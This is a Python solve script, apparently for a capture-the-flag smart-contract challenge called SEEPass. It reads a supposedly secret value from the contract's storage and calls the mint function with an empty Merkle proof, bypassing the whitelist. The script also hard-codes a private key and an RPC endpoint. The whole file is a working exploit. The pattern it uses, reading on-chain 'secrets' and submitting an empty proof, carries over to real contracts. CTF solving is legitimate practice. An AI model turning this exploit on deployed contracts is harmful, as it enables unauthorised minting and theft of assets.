from web3 import Web3
from pwn import log, remote
import json
log.setLevel('debug')


uuid = '5db22b41-a2be-4b7d-87c0-1b5e3f35e0a1'
rpc = 'http://win.the.seetf.sg:8545/5db22b41-a2be-4b7d-87c0-1b5e3f35e0a1'
private_key = "0xc2d07b0be0c60fefc02260d7399b77b6b36f73d7c747556ede541b5653b64196"
setupAddress = "0x5C2B8954b19901e3930fcf0B06bbF911E501AD00"
log.info(f"{uuid = }")
log.info(f"{rpc = }")
log.info(f"{private_key = }")
log.info(f"{setupAddress = }")
w3 = Web3(Web3.HTTPProvider(rpc))
account = w3.eth.account.from_key(private_key)
my_address = account.address
chainID = w3.eth.chain_id
gasPrice = w3.eth.gas_price

log.info(f"My address: {my_address}")
# log.info(f"My balance: {w3.eth.get_balance(my_address)}")


# compile sol
SetupContract = json.load(open("out/Setup.sol/Setup.json", 'rb'))
SEEPassContract = json.load(open("out/SEEPass.sol/SEEPass.json", 'rb'))
# remote contract
setup = w3.eth.contract(address=setupAddress, abi=SetupContract['abi'])
SEEPassAddress = setup.get_function_by_name('pass')().call()
SEEPass = w3.eth.contract(address=SEEPassAddress, abi=SEEPassContract['abi'])
proof = int.from_bytes(w3.eth.get_storage_at(SEEPassAddress, 6), 'big')


def view_storage(_address, n=5):
    for i in range(n):
        res = w3.eth.get_storage_at(_address, i)
        log.debug(f"{hex(i)} : {res}")
# view_storage(SEEPassAddress, 6)


func_call = SEEPass.functions.mintSeePass([], proof).build_transaction({
    "from": my_address,
    "nonce": w3.eth.get_transaction_count(my_address),
    "gasPrice": w3.eth.gas_price,
    "value": 0,
    "chainId": w3.eth.chain_id
})
signed_tx = w3.eth.account.sign_transaction(func_call, private_key)
result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
log.info(str(transaction_receipt))
assert SEEPass.functions.hasMinted(proof).call() == True
log.success('Successfully exploiting!')
